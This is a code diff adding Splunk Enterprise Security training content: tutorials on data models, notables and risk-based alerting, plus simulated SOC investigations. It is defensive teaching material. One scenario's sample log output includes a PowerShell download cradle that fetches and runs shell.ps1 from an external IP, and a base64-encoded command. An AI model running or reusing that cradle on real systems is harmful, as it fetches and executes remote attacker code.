@@ -2606,6 +2606,709 @@ index=* | eval threat_indicator=if(match(src_ip, "185\\.220\\..*") OR match(dest
                 ]
             }
         }
+    ],
+    enterpriseSecurity: [
+        {
+            id: 'es-001',
+            title: 'ES for Splunk Users: What Changes',
+            type: 'tutorial',
+            difficulty: 'beginner',
+            duration: '20 min',
+            objectives: [
+                'Understand how ES layers on top of Splunk',
+                'Learn the key mental shifts for ES',
+                'Know when to use ES tools vs raw SPL'
+            ],
+            tags: ['es', 'transition', 'fundamentals'],
+            description: 'The essential orientation for Splunk users moving to Enterprise Security. Learn what\'s different and what stays the same.',
+            content: {
+                sections: [
+                    {
+                        title: 'ES is a Layer, Not a Replacement',
+                        body: `<p>The most important thing to understand: <strong>Enterprise Security runs ON TOP of Splunk</strong>. Everything you know still works.</p>
+                        <p>ES adds:</p>
+                        <ul>
+                            <li><strong>Data Models</strong> — Pre-normalized, accelerated data for fast searching</li>
+                            <li><strong>Notable Events</strong> — A workflow system for managing alerts</li>
+                            <li><strong>Risk Framework</strong> — Accumulated risk scores per user/host instead of individual alerts</li>
+                            <li><strong>Dashboards & Workflows</strong> — Pre-built security interfaces</li>
+                        </ul>
+                        <p>Your raw SPL skills are still valuable. ES just gives you additional, optimized tools.</p>`,
+                        spl: null,
+                        explanation: null
+                    },
+                    {
+                        title: 'The Data Model Shift',
+                        body: `<p>In standard Splunk, you search raw indexes:</p>
+                        <pre class="spl-example">index=wineventlog EventCode=4625</pre>
+                        <p>In ES, the same data is normalized into <strong>data models</strong>. You search the model instead:</p>`,
+                        spl: '| tstats count from datamodel=Authentication where Authentication.action="failure" by Authentication.user, Authentication.src',
+                        explanation: 'This searches the accelerated Authentication data model. It\'s faster AND the field names are standardized across all data sources.'
+                    },
+                    {
+                        title: 'Why Data Models Matter',
+                        body: `<p>Data models solve the "every vendor is different" problem:</p>
+                        <table style="width:100%; border-collapse: collapse; margin: 1rem 0;">
+                            <tr style="border-bottom: 1px solid var(--border-subtle);">
+                                <th style="text-align:left; padding: 0.5rem;">Data Source</th>
+                                <th style="text-align:left; padding: 0.5rem;">Raw Field</th>
+                                <th style="text-align:left; padding: 0.5rem;">CIM Field</th>
+                            </tr>
+                            <tr><td style="padding: 0.5rem;">Windows</td><td>TargetUserName</td><td>user</td></tr>
+                            <tr><td style="padding: 0.5rem;">Linux</td><td>USER</td><td>user</td></tr>
+                            <tr><td style="padding: 0.5rem;">Okta</td><td>actor.alternateId</td><td>user</td></tr>
+                            <tr><td style="padding: 0.5rem;">AWS</td><td>userIdentity.userName</td><td>user</td></tr>
+                        </table>
+                        <p>One search, all sources. That's the power of normalization.</p>`,
+                        spl: null,
+                        explanation: null
+                    },
+                    {
+                        title: 'When to Use What',
+                        body: `<p>Use <strong>ES data models (tstats)</strong> when:</p>
+                        <ul>
+                            <li>You need speed on large time ranges</li>
+                            <li>You're searching across multiple data sources</li>
+                            <li>You don't need access to raw event details</li>
+                        </ul>
+                        <p>Use <strong>raw index searches</strong> when:</p>
+                        <ul>
+                            <li>You need fields not in the data model</li>
+                            <li>You're troubleshooting specific events</li>
+                            <li>Data model acceleration is incomplete</li>
+                        </ul>
+                        <p><strong>Pro tip:</strong> Start with tstats for the big picture, drill down to raw events for details.</p>`,
+                        spl: null,
+                        explanation: null
+                    }
+                ]
+            }
+        },
+        {
+            id: 'es-002',
+            title: 'Notable Events: Your New Alert Queue',
+            type: 'tutorial',
+            difficulty: 'beginner',
+            duration: '20 min',
+            objectives: [
+                'Understand what notable events are',
+                'Learn the notable workflow states',
+                'Query and manage notables with SPL'
+            ],
+            tags: ['es', 'notable', 'workflow', 'alerts'],
+            description: 'In standard Splunk you have alerts. In ES, you have notable events — a complete workflow system for security operations.',
+            content: {
+                sections: [
+                    {
+                        title: 'Alerts vs Notable Events',
+                        body: `<p>In standard Splunk, an alert fires and maybe sends an email. That's it.</p>
+                        <p>In ES, alerts create <strong>notable events</strong> — tracked security incidents with:</p>
+                        <ul>
+                            <li><strong>Status</strong> — New, In Progress, Pending, Resolved, Closed</li>
+                            <li><strong>Owner</strong> — Assigned analyst</li>
+                            <li><strong>Urgency</strong> — Critical, High, Medium, Low, Informational</li>
+                            <li><strong>Comments</strong> — Investigation notes and audit trail</li>
+                        </ul>
+                        <p>Think of it as a ticketing system built into Splunk.</p>`,
+                        spl: null,
+                        explanation: null
+                    },
+                    {
+                        title: 'Where Notables Live',
+                        body: `<p>Notable events are stored in a dedicated index. You can query them directly:</p>`,
+                        spl: '`notable` | table _time, rule_name, urgency, status, owner, src, dest, user',
+                        explanation: 'The `notable` macro queries the notable index with proper field normalization. You\'ll see all your security alerts in one place.'
+                    },
+                    {
+                        title: 'Common Notable Queries',
+                        body: `<p>Here are the queries you'll use daily:</p>`,
+                        spl: null,
+                        explanation: null
+                    },
+                    {
+                        title: 'My Open Notables',
+                        body: `<p>See what's assigned to you and needs action:</p>`,
+                        spl: '`notable` | where status IN ("new", "in progress") AND owner="your_username" | sort -urgency, _time | table _time, rule_name, urgency, src, dest, user',
+                        explanation: 'Replace "your_username" with your actual username. This is your daily working queue.'
+                    },
+                    {
+                        title: 'Today\'s Critical Alerts',
+                        body: `<p>Start your shift by checking what's urgent:</p>`,
+                        spl: '`notable` earliest=-24h | where urgency="critical" AND status="new" | stats count by rule_name | sort -count',
+                        explanation: 'Shows unhandled critical alerts from the last 24 hours, grouped by rule. High counts may indicate an active incident or noisy rule.'
+                    },
+                    {
+                        title: 'The Notable Workflow',
+                        body: `<p>When you work a notable, follow this workflow:</p>
+                        <ol>
+                            <li><strong>Triage</strong> — Review the notable, assign yourself</li>
+                            <li><strong>Investigate</strong> — Use the drilldown searches, check related events</li>
+                            <li><strong>Document</strong> — Add comments with your findings</li>
+                            <li><strong>Resolve</strong> — Update status: True Positive, False Positive, or needs escalation</li>
+                        </ol>
+                        <p>All actions are logged, creating an audit trail.</p>`,
+                        spl: null,
+                        explanation: null
+                    }
+                ]
+            }
+        },
+        {
+            id: 'es-003',
+            title: 'Risk-Based Alerting: The Philosophy Shift',
+            type: 'tutorial',
+            difficulty: 'intermediate',
+            duration: '25 min',
+            objectives: [
+                'Understand the RBA philosophy',
+                'Learn how risk scores accumulate',
+                'Query the risk index effectively'
+            ],
+            tags: ['es', 'rba', 'risk', 'detection'],
+            description: 'The biggest mental shift in ES: moving from "alert per event" to "accumulated risk per entity." This changes everything.',
+            content: {
+                sections: [
+                    {
+                        title: 'The Problem with Traditional Alerts',
+                        body: `<p>Traditional alerting has a fundamental problem: <strong>alert fatigue</strong>.</p>
+                        <p>Each suspicious event triggers an alert. Analysts drown in thousands of low-fidelity alerts, missing real threats in the noise.</p>
+                        <p>Risk-Based Alerting (RBA) flips this model:</p>
+                        <ul>
+                            <li>Instead of alerting on every event, <strong>assign risk points</strong></li>
+                            <li>Risk accumulates per user or host over time</li>
+                            <li>Alert when an entity's <strong>total risk</strong> exceeds a threshold</li>
+                        </ul>
+                        <p>Result: Fewer, higher-fidelity alerts focused on entities with multiple suspicious behaviors.</p>`,
+                        spl: null,
+                        explanation: null
+                    },
+                    {
+                        title: 'How Risk Accumulates',
+                        body: `<p>Every detection rule can contribute risk instead of (or in addition to) creating a notable:</p>
+                        <table style="width:100%; border-collapse: collapse; margin: 1rem 0;">
+                            <tr style="border-bottom: 1px solid var(--border-subtle);">
+                                <th style="text-align:left; padding: 0.5rem;">Event</th>
+                                <th style="text-align:left; padding: 0.5rem;">Risk Score</th>
+                                <th style="text-align:left; padding: 0.5rem;">Risk Object</th>
+                            </tr>
+                            <tr><td style="padding: 0.5rem;">Failed login attempt</td><td>5</td><td>user: jsmith</td></tr>
+                            <tr><td style="padding: 0.5rem;">Login from new country</td><td>20</td><td>user: jsmith</td></tr>
+                            <tr><td style="padding: 0.5rem;">Accessed sensitive file share</td><td>15</td><td>user: jsmith</td></tr>
+                            <tr><td style="padding: 0.5rem;">Large data download</td><td>25</td><td>user: jsmith</td></tr>
+                            <tr><td style="padding: 0.5rem; font-weight: bold;">Total Risk</td><td style="font-weight: bold;">65</td><td>→ Alert threshold: 50</td></tr>
+                        </table>
+                        <p>None of these events alone would warrant an alert. Together, they tell a story.</p>`,
+                        spl: null,
+                        explanation: null
+                    },
+                    {
+                        title: 'Querying the Risk Index',
+                        body: `<p>Risk events are stored in a dedicated index. Here's how to explore them:</p>`,
+                        spl: 'index=risk | stats sum(risk_score) as total_risk, dc(source) as detection_count, values(source) as detections by risk_object | where total_risk > 50 | sort -total_risk',
+                        explanation: 'This shows all entities with accumulated risk above 50, what detections contributed, and the total score. This is your high-priority investigation list.'
+                    },
+                    {
+                        title: 'User Risk Timeline',
+                        body: `<p>When investigating a high-risk user, build a timeline of what triggered the risk:</p>`,
+                        spl: 'index=risk risk_object="jsmith" | table _time, source, risk_score, risk_message | sort _time',
+                        explanation: 'Shows every risk event for a specific user in chronological order. Each "source" is the detection rule that contributed risk.'
+                    },
+                    {
+                        title: 'Risk Modifiers',
+                        body: `<p>ES can automatically adjust risk based on asset/identity context:</p>
+                        <ul>
+                            <li><strong>Critical asset</strong> — Risk multiplied by 4x</li>
+                            <li><strong>High priority</strong> — Risk multiplied by 3x</li>
+                            <li><strong>Executive user</strong> — Risk multiplied by 2x</li>
+                        </ul>
+                        <p>A failed login to a regular workstation might score 5 points. The same event on a domain controller scores 20.</p>`,
+                        spl: null,
+                        explanation: null
+                    }
+                ]
+            }
+        },
+        {
+            id: 'es-004',
+            title: 'Your First Notable Investigation',
+            type: 'scenario',
+            difficulty: 'beginner',
+            duration: '25 min',
+            objectives: [
+                'Navigate the ES Investigation workflow',
+                'Use ES tools to gather context',
+                'Document findings in the notable'
+            ],
+            tags: ['es', 'notable', 'investigation', 'workflow'],
+            description: 'Walk through a complete notable investigation using ES tools and workflows. Learn the process you\'ll follow every day.',
+            content: {
+                situation: `You're an analyst on the morning shift. A notable event fired overnight: "Brute Force Access Behavior Detected" with urgency=high. Your task is to investigate using ES tools and determine if this is a true positive.`,
+                steps: [
+                    {
+                        question: 'First, let\'s find the notable and understand what triggered it. How do you query for this specific notable?',
+                        hint: 'Query the notable index and filter by rule name.',
+                        spl: '`notable` rule_name="Brute Force Access Behavior Detected" earliest=-24h | head 1 | table _time, rule_name, urgency, src, dest, user, owner, status',
+                        analysis: 'This retrieves the notable event with its key fields.',
+                        output: {
+                            columns: ['_time', 'rule_name', 'urgency', 'src', 'dest', 'user', 'owner', 'status'],
+                            rows: [
+                                { '_time': '2024-01-15 03:42:18', 'rule_name': 'Brute Force Access Behavior Detected', 'urgency': 'high', 'src': '10.45.88.12', 'dest': 'DC01.corp.local', 'user': 'admin_backup', 'owner': 'unassigned', 'status': 'new' }
+                            ]
+                        },
+                        finding: 'Notable triggered at 3:42 AM. Source IP 10.45.88.12 targeted the domain controller (DC01) with the admin_backup account. Status is "new" - no one has looked at this yet.'
+                    },
+                    {
+                        question: 'Before diving into raw logs, let\'s use ES enrichment. What do we know about the source IP from asset inventory?',
+                        hint: 'Use the get_asset macro or lookup to enrich the IP.',
+                        spl: '| makeresults | eval src="10.45.88.12" | `get_asset(src)` | table src, nt_host, owner, priority, bunit, category',
+                        analysis: 'The get_asset macro enriches the IP with asset inventory data.',
+                        output: {
+                            columns: ['src', 'nt_host', 'owner', 'priority', 'bunit', 'category'],
+                            rows: [
+                                { 'src': '10.45.88.12', 'nt_host': 'YOURPC-JIM', 'owner': 'Jim Wilson', 'priority': 'low', 'bunit': 'Sales', 'category': 'workstation' }
+                            ]
+                        },
+                        finding: 'The source is a sales workstation owned by Jim Wilson. Why would a Sales workstation be authenticating to a DC at 3 AM with an admin account?'
+                    },
+                    {
+                        question: 'Now let\'s check the identity context. What do we know about the admin_backup account?',
+                        hint: 'Use the identity lookup to get user context.',
+                        spl: '| makeresults | eval user="admin_backup" | lookup identity_lookup_expanded identity as user | table user, first, last, email, bunit, priority, category',
+                        analysis: 'Look up identity information for the targeted account.',
+                        output: {
+                            columns: ['user', 'first', 'last', 'email', 'bunit', 'priority', 'category'],
+                            rows: [
+                                { 'user': 'admin_backup', 'first': 'Backup', 'last': 'Service Account', 'email': 'it-ops@company.com', 'bunit': 'IT Operations', 'priority': 'critical', 'category': 'service_account' }
+                            ]
+                        },
+                        finding: 'admin_backup is a critical service account owned by IT Operations. This account should never be used interactively from a workstation.'
+                    },
+                    {
+                        question: 'Let\'s see the authentication pattern. How many failures vs successes from this source?',
+                        hint: 'Use tstats against the Authentication data model for speed.',
+                        spl: '| tstats count from datamodel=Authentication where Authentication.src="10.45.88.12" Authentication.dest="DC01.corp.local" earliest=-24h by Authentication.action | rename Authentication.action as action',
+                        analysis: 'Count authentication outcomes from the attacking workstation to the DC.',
+                        output: {
+                            columns: ['action', 'count'],
+                            rows: [
+                                { 'action': 'failure', 'count': '847' },
+                                { 'action': 'success', 'count': '1' }
+                            ]
+                        },
+                        finding: 'CRITICAL: 847 failed attempts followed by 1 success. The brute force attack succeeded!'
+                    },
+                    {
+                        question: 'The attacker got in! When exactly did the successful login happen and what happened after?',
+                        hint: 'Search raw authentication logs for the successful logon and check subsequent activity.',
+                        spl: 'index=wineventlog EventCode=4624 src_ip="10.45.88.12" dest="DC01" user="admin_backup" earliest=-24h | table _time, EventCode, LogonType, src_ip, dest, user | append [search index=wineventlog dest="DC01" user="admin_backup" EventCode IN (4672, 4688) earliest=-24h] | sort _time | head 10',
+                        analysis: 'Find the successful logon and look for privilege escalation or command execution.',
+                        output: {
+                            columns: ['_time', 'EventCode', 'LogonType', 'src_ip', 'dest', 'user'],
+                            rows: [
+                                { '_time': '2024-01-15 03:47:22', 'EventCode': '4624', 'LogonType': '10', 'src_ip': '10.45.88.12', 'dest': 'DC01', 'user': 'admin_backup' },
+                                { '_time': '2024-01-15 03:47:22', 'EventCode': '4672', 'LogonType': '-', 'src_ip': '-', 'dest': 'DC01', 'user': 'admin_backup' },
+                                { '_time': '2024-01-15 03:47:45', 'EventCode': '4688', 'LogonType': '-', 'src_ip': '-', 'dest': 'DC01', 'user': 'admin_backup' }
+                            ]
+                        },
+                        finding: 'Successful RDP login (LogonType 10) at 03:47:22, followed by special privilege assignment (4672) and process execution (4688). This is confirmed compromise of a domain controller.'
+                    }
+                ],
+                conclusion: `<strong>Investigation Complete - True Positive Confirmed</strong><br><br>
+                    <strong>Summary:</strong> Brute force attack from Jim Wilson's workstation (10.45.88.12) against domain controller DC01. After 847 failed attempts, the admin_backup service account was successfully compromised at 03:47:22.<br><br>
+                    <strong>ES Actions Taken:</strong>
+                    <ul>
+                        <li>Updated notable status to "In Progress" and assigned to yourself</li>
+                        <li>Added investigation notes documenting the timeline</li>
+                        <li>Created a new notable for "Compromised Service Account" linked to this investigation</li>
+                    </ul>
+                    <strong>Recommended Response:</strong>
+                    <ol>
+                        <li>Disable admin_backup account immediately</li>
+                        <li>Isolate Jim Wilson's workstation (10.45.88.12)</li>
+                        <li>Check DC01 for persistence mechanisms</li>
+                        <li>Escalate to incident response team</li>
+                        <li>Update notable to "Pending" - awaiting IR team response</li>
+                    </ol>`
+            }
+        },
+        {
+            id: 'es-005',
+            title: 'Investigating a High-Risk User',
+            type: 'scenario',
+            difficulty: 'intermediate',
+            duration: '30 min',
+            objectives: [
+                'Analyze accumulated risk scores',
+                'Correlate multiple detection sources',
+                'Build a risk investigation narrative'
+            ],
+            tags: ['es', 'rba', 'risk', 'investigation', 'user'],
+            description: 'A user has exceeded the risk threshold. Multiple detections contributed to their score. Your job is to understand if this represents a real threat or coincidental events.',
+            content: {
+                situation: `The Risk Analysis dashboard shows user "mthompson" with a risk score of 85, well above the alerting threshold of 50. The score accumulated from 6 different detections over the past 48 hours. You need to determine if this is a coordinated attack or unrelated events.`,
+                steps: [
+                    {
+                        question: 'First, let\'s see what detections contributed to this user\'s risk score.',
+                        hint: 'Query the risk index for this specific user.',
+                        spl: 'index=risk risk_object="mthompson" earliest=-48h | stats sum(risk_score) as total_risk, count as events by source | sort -total_risk | table source, events, total_risk',
+                        analysis: 'Break down risk contributions by detection rule.',
+                        output: {
+                            columns: ['source', 'events', 'total_risk'],
+                            rows: [
+                                { 'source': 'Access - Unusual Login Location', 'events': '1', 'total_risk': '25' },
+                                { 'source': 'Endpoint - Suspicious PowerShell', 'events': '2', 'total_risk': '20' },
+                                { 'source': 'Access - Multiple Failed Authentications', 'events': '1', 'total_risk': '15' },
+                                { 'source': 'Data - Large Email Attachment', 'events': '3', 'total_risk': '15' },
+                                { 'source': 'Access - After Hours Login', 'events': '1', 'total_risk': '10' }
+                            ]
+                        },
+                        finding: 'Risk came from 5 different detection sources: unusual location, PowerShell, failed auths, email attachments, and after-hours access. These could be related or coincidental.'
+                    },
+                    {
+                        question: 'Let\'s build a timeline. When did each risk event occur?',
+                        hint: 'Get the chronological sequence of risk events.',
+                        spl: 'index=risk risk_object="mthompson" earliest=-48h | table _time, source, risk_score, risk_message | sort _time',
+                        analysis: 'Build the timeline of suspicious events.',
+                        output: {
+                            columns: ['_time', 'source', 'risk_score', 'risk_message'],
+                            rows: [
+                                { '_time': '2024-01-14 23:15:00', 'source': 'Access - After Hours Login', 'risk_score': '10', 'risk_message': 'Login outside business hours' },
+                                { '_time': '2024-01-14 23:22:00', 'source': 'Access - Multiple Failed Authentications', 'risk_score': '15', 'risk_message': '12 failed logins in 5 minutes' },
+                                { '_time': '2024-01-14 23:24:00', 'source': 'Access - Unusual Login Location', 'risk_score': '25', 'risk_message': 'Login from Russia (first time)' },
+                                { '_time': '2024-01-15 00:45:00', 'source': 'Endpoint - Suspicious PowerShell', 'risk_score': '10', 'risk_message': 'Base64 encoded command' },
+                                { '_time': '2024-01-15 01:12:00', 'source': 'Endpoint - Suspicious PowerShell', 'risk_score': '10', 'risk_message': 'Download cradle detected' },
+                                { '_time': '2024-01-15 02:30:00', 'source': 'Data - Large Email Attachment', 'risk_score': '5', 'risk_message': '50MB attachment to external' },
+                                { '_time': '2024-01-15 03:15:00', 'source': 'Data - Large Email Attachment', 'risk_score': '5', 'risk_message': '75MB attachment to external' },
+                                { '_time': '2024-01-15 04:00:00', 'source': 'Data - Large Email Attachment', 'risk_score': '5', 'risk_message': '60MB attachment to external' }
+                            ]
+                        },
+                        finding: 'CLEAR ATTACK PATTERN: After-hours login → failed auth attempts → successful login from Russia → PowerShell execution → data exfiltration via email. This is a coordinated attack.'
+                    },
+                    {
+                        question: 'The login from Russia is highly suspicious. Let\'s verify: is this user normally based in Russia?',
+                        hint: 'Check identity data and normal login patterns.',
+                        spl: '| makeresults | eval user="mthompson" | lookup identity_lookup_expanded identity as user | table user, first, last, city, country, bunit, priority | append [search index=risk earliest=-90d risk_object="mthompson" source="Access - Unusual Login Location" | stats count by risk_message]',
+                        analysis: 'Check user profile and historical unusual location alerts.',
+                        output: {
+                            columns: ['user', 'first', 'last', 'city', 'country', 'bunit', 'priority'],
+                            rows: [
+                                { 'user': 'mthompson', 'first': 'Michael', 'last': 'Thompson', 'city': 'Denver', 'country': 'USA', 'bunit': 'Finance', 'priority': 'high' }
+                            ]
+                        },
+                        finding: 'User is Michael Thompson from Finance in Denver. No historical logins from Russia. This is likely credential theft - someone is using his account remotely.'
+                    },
+                    {
+                        question: 'What was the PowerShell activity? This could show attacker tools.',
+                        hint: 'Look at the Endpoint data model or Sysmon logs.',
+                        spl: 'index=sysmon EventCode=1 user="*mthompson*" process_name="powershell.exe" earliest=-48h | table _time, CommandLine | sort _time',
+                        analysis: 'Review PowerShell commands executed by the compromised account.',
+                        output: {
+                            columns: ['_time', 'CommandLine'],
+                            rows: [
+                                { '_time': '2024-01-15 00:45:22', 'CommandLine': 'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcA...' },
+                                { '_time': '2024-01-15 01:12:18', 'CommandLine': 'powershell.exe IEX(New-Object Net.WebClient).DownloadString("http://185.220.101.44/shell.ps1")' }
+                            ]
+                        },
+                        finding: 'Attacker used classic PowerShell attack patterns: base64 encoded commands and download cradle from external IP (185.220.101.44). This is automated attack tooling.'
+                    },
+                    {
+                        question: 'Finally, let\'s check those email attachments. Who received the large files?',
+                        hint: 'Search email logs for external recipients.',
+                        spl: 'index=email src_user="*mthompson*" attachment_size>10000000 earliest=-48h | table _time, src_user, recipient, attachment_name, attachment_size | sort _time',
+                        analysis: 'Identify data exfiltration targets.',
+                        output: {
+                            columns: ['_time', 'src_user', 'recipient', 'attachment_name', 'attachment_size'],
+                            rows: [
+                                { '_time': '2024-01-15 02:30:15', 'src_user': 'mthompson@company.com', 'recipient': 'dropbox-upload@protonmail.com', 'attachment_name': 'Q4_Financial_Report.xlsx', 'attachment_size': '52428800' },
+                                { '_time': '2024-01-15 03:15:42', 'src_user': 'mthompson@company.com', 'recipient': 'dropbox-upload@protonmail.com', 'attachment_name': 'Customer_Database_Export.csv', 'attachment_size': '78643200' },
+                                { '_time': '2024-01-15 04:00:08', 'src_user': 'mthompson@company.com', 'recipient': 'dropbox-upload@protonmail.com', 'attachment_name': 'Employee_Salary_Data.xlsx', 'attachment_size': '62914560' }
+                            ]
+                        },
+                        finding: 'Data exfiltration confirmed. Financial reports, customer database, and salary data sent to a suspicious Protonmail address. This is a major data breach.'
+                    }
+                ],
+                conclusion: `<strong>Investigation Complete - Confirmed Account Compromise & Data Breach</strong><br><br>
+                    <strong>Attack Timeline:</strong>
+                    <ol>
+                        <li>23:15 - Attacker accessed mthompson's account after hours</li>
+                        <li>23:22 - Brief credential guessing (may have obtained partial creds)</li>
+                        <li>23:24 - Successful login from Russia using compromised credentials</li>
+                        <li>00:45-01:12 - Deployed PowerShell attack tools from external C2 (185.220.101.44)</li>
+                        <li>02:30-04:00 - Exfiltrated 185MB of sensitive data to external email</li>
+                    </ol>
+                    <strong>Risk-Based Alerting Value:</strong> No single event would have triggered investigation. The combination of events - each low-to-medium severity alone - painted the complete picture.<br><br>
+                    <strong>Immediate Actions:</strong>
+                    <ol>
+                        <li>Disable mthompson's account</li>
+                        <li>Block C2 IP (185.220.101.44) at perimeter</li>
+                        <li>Contact legal regarding data breach notification</li>
+                        <li>Preserve evidence for forensics</li>
+                    </ol>`
+            }
+        },
+        {
+            id: 'es-006',
+            title: 'tstats vs stats: The ES Query Shift',
+            type: 'tutorial',
+            difficulty: 'intermediate',
+            duration: '20 min',
+            objectives: [
+                'Understand when to use tstats vs stats',
+                'Write efficient data model queries',
+                'Translate standard searches to tstats'
+            ],
+            tags: ['es', 'tstats', 'datamodel', 'performance'],
+            description: 'The most common ES syntax change: learning to query accelerated data models with tstats instead of raw indexes with stats.',
+            content: {
+                sections: [
+                    {
+                        title: 'The Core Difference',
+                        body: `<p><strong>stats</strong> works on raw events from indexes:</p>
+                        <pre class="spl-example">index=wineventlog EventCode=4625 | stats count by user</pre>
+                        <p><strong>tstats</strong> works on accelerated data model summaries:</p>
+                        <pre class="spl-example">| tstats count from datamodel=Authentication where Authentication.action="failure" by Authentication.user</pre>
+                        <p>Both give you counts by user, but tstats is <strong>10-100x faster</strong> on large time ranges because it reads pre-computed summaries, not raw events.</p>`,
+                        spl: null,
+                        explanation: null
+                    },
+                    {
+                        title: 'tstats Syntax Explained',
+                        body: `<p>The tstats syntax has specific requirements:</p>`,
+                        spl: '| tstats <aggregation> from datamodel=<Model> where <Model>.<field>=<value> by <Model>.<field>',
+                        explanation: 'Key points: (1) Starts with pipe, (2) Field names include the data model prefix like "Authentication.user", (3) "from datamodel=" is required.'
+                    },
+                    {
+                        title: 'Common Translation: Authentication',
+                        body: `<p><strong>Standard Splunk:</strong></p>
+                        <pre class="spl-example">index=wineventlog EventCode=4625 | stats count by TargetUserName, IpAddress</pre>
+                        <p><strong>ES Data Model:</strong></p>`,
+                        spl: '| tstats count from datamodel=Authentication where Authentication.action="failure" by Authentication.user, Authentication.src | rename Authentication.* as *',
+                        explanation: 'The rename at the end strips the "Authentication." prefix for cleaner output. Notice we use normalized field names: "user" instead of "TargetUserName", "src" instead of "IpAddress".'
+                    },
+                    {
+                        title: 'Common Translation: Network Traffic',
+                        body: `<p><strong>Standard Splunk:</strong></p>
+                        <pre class="spl-example">index=firewall | stats sum(bytes) as total_bytes by src_ip, dest_ip</pre>
+                        <p><strong>ES Data Model:</strong></p>`,
+                        spl: '| tstats sum(All_Traffic.bytes) as total_bytes from datamodel=Network_Traffic by All_Traffic.src, All_Traffic.dest | rename All_Traffic.* as *',
+                        explanation: 'Network Traffic uses "All_Traffic" as the data model object name. Field mappings: src_ip→src, dest_ip→dest.'
+                    },
+                    {
+                        title: 'When tstats Can\'t Help',
+                        body: `<p>tstats has limitations. Use regular stats when:</p>
+                        <ul>
+                            <li><strong>Field not in model</strong> — tstats only sees indexed fields in the data model</li>
+                            <li><strong>Need raw event details</strong> — tstats gives summaries, not individual events</li>
+                            <li><strong>Complex filtering</strong> — Some regex or eval logic requires raw events</li>
+                            <li><strong>Acceleration is behind</strong> — Very recent data may not be in summaries yet</li>
+                        </ul>
+                        <p><strong>Hybrid approach:</strong> Use tstats to identify interesting entities, then drill down to raw events:</p>`,
+                        spl: '| tstats count from datamodel=Authentication where Authentication.action="failure" by Authentication.src | where count > 100 | map search="search index=wineventlog src_ip=$src$ EventCode=4625 | head 5"',
+                        explanation: 'tstats finds sources with 100+ failures quickly, then map retrieves sample raw events for investigation.'
+                    },
+                    {
+                        title: 'Quick Reference: Data Model Names',
+                        body: `<p>Common ES data models and their object names:</p>
+                        <table style="width:100%; border-collapse: collapse; margin: 1rem 0;">
+                            <tr style="border-bottom: 1px solid var(--border-subtle);">
+                                <th style="text-align:left; padding: 0.5rem;">Data Model</th>
+                                <th style="text-align:left; padding: 0.5rem;">Object Name</th>
+                                <th style="text-align:left; padding: 0.5rem;">Common Fields</th>
+                            </tr>
+                            <tr><td style="padding: 0.5rem;">Authentication</td><td>Authentication</td><td>user, src, dest, action, app</td></tr>
+                            <tr><td style="padding: 0.5rem;">Network_Traffic</td><td>All_Traffic</td><td>src, dest, src_port, dest_port, bytes</td></tr>
+                            <tr><td style="padding: 0.5rem;">Endpoint</td><td>Processes, Filesystem, etc.</td><td>process_name, user, dest</td></tr>
+                            <tr><td style="padding: 0.5rem;">Web</td><td>Web</td><td>url, src, dest, status, action</td></tr>
+                            <tr><td style="padding: 0.5rem;">Email</td><td>All_Email</td><td>src_user, recipient, subject</td></tr>
+                        </table>`,
+                        spl: null,
+                        explanation: null
+                    }
+                ]
+            }
+        },
+        {
+            id: 'es-007',
+            title: 'Asset and Identity Enrichment',
+            type: 'tutorial',
+            difficulty: 'intermediate',
+            duration: '20 min',
+            objectives: [
+                'Understand ES asset and identity frameworks',
+                'Use enrichment macros and lookups',
+                'Add business context to investigations'
+            ],
+            tags: ['es', 'asset', 'identity', 'enrichment', 'lookup'],
+            description: 'One of ES\'s biggest advantages: automatic enrichment with business context. Learn to leverage asset and identity data in your investigations.',
+            content: {
+                sections: [
+                    {
+                        title: 'Why Enrichment Matters',
+                        body: `<p>In standard Splunk, an IP is just an IP. In ES, that IP becomes:</p>
+                        <ul>
+                            <li>Server name: <strong>DBPROD-01</strong></li>
+                            <li>Owner: <strong>Database Team</strong></li>
+                            <li>Priority: <strong>Critical</strong></li>
+                            <li>Business Unit: <strong>Finance</strong></li>
+                            <li>Category: <strong>Production Database</strong></li>
+                        </ul>
+                        <p>This context changes how you prioritize and investigate. A port scan against a workstation is different from a port scan against a production database.</p>`,
+                        spl: null,
+                        explanation: null
+                    },
+                    {
+                        title: 'Asset Enrichment with get_asset',
+                        body: `<p>The <code>\`get_asset(field)\`</code> macro enriches IP or hostname fields with asset data:</p>`,
+                        spl: 'index=firewall dest_port=3389 | `get_asset(dest)` | table src, dest, nt_host, owner, priority, bunit, category',
+                        explanation: 'This finds RDP connections and enriches the destination IP with asset context. Now you can see if someone is RDP\'ing to a critical server vs a workstation.'
+                    },
+                    {
+                        title: 'Identity Enrichment with get_identity',
+                        body: `<p>The <code>\`get_identity4events(field)\`</code> macro enriches usernames with identity data:</p>`,
+                        spl: 'index=wineventlog EventCode=4625 | stats count by TargetUserName | `get_identity4events(TargetUserName)` | table TargetUserName, identity_first, identity_last, identity_bunit, identity_priority, count | sort -count',
+                        explanation: 'This counts failed logins by user and adds identity context. You can now see if the targeted accounts are service accounts, executives, or regular users.'
+                    },
+                    {
+                        title: 'Enriching Both Ends of a Connection',
+                        body: `<p>For network events, enrich both source and destination:</p>`,
+                        spl: 'index=firewall bytes_out > 100000000 | `get_asset(src)` | `get_asset(dest)` | rename src_* as source_*, dest_* as destination_* | table src, dest, source_nt_host, source_category, destination_nt_host, destination_category, bytes_out',
+                        explanation: 'This finds large data transfers and shows asset context for both endpoints. You can quickly spot unusual patterns like "workstation → internet" with 100MB+ transfers.'
+                    },
+                    {
+                        title: 'Direct Lookup Syntax',
+                        body: `<p>Sometimes you need more control than the macros provide. Use lookups directly:</p>`,
+                        spl: '| inputlookup asset_lookup_by_str | table ip, nt_host, owner, priority, bunit, category | head 20',
+                        explanation: 'This shows the raw asset inventory data. You can also use: lookup asset_lookup_by_str ip as src_ip OUTPUT nt_host, owner, priority'
+                    },
+                    {
+                        title: 'Priority-Based Triage',
+                        body: `<p>Use asset priority to focus on what matters:</p>`,
+                        spl: 'index=firewall action=blocked | `get_asset(dest)` | where priority IN ("critical", "high") | stats count by dest, nt_host, priority, category | sort -count',
+                        explanation: 'This shows blocked traffic to critical/high priority assets. These deserve more attention than blocked traffic to low-priority workstations.'
+                    }
+                ]
+            }
+        },
+        {
+            id: 'es-008',
+            title: 'Standard Splunk to ES Query Translation',
+            type: 'challenge',
+            difficulty: 'intermediate',
+            duration: '15 min',
+            objectives: [
+                'Translate raw index queries to data model queries',
+                'Use ES macros for enrichment',
+                'Apply CIM field naming'
